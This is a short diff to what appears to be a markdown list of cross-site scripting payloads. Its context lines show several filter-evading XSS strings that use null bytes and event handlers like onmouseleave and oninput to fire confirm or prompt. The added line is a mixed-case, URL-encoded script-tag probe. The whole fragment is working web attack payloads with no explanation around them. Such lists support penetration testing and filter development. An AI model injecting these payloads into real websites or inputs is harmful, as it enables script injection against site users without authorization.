@@ -200,6 +200,7 @@
   XSS"><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
   XSS"><html><select %00 onControl onpointerenter=prompt(domain) hello>
   XSS"><input %00 onControl hello oninput=confirm(domain) x>
+  "()%26%25<acx><ScRiPt%20>N8Zn(9266)</ScRiPt>
   ```
 </details>
 
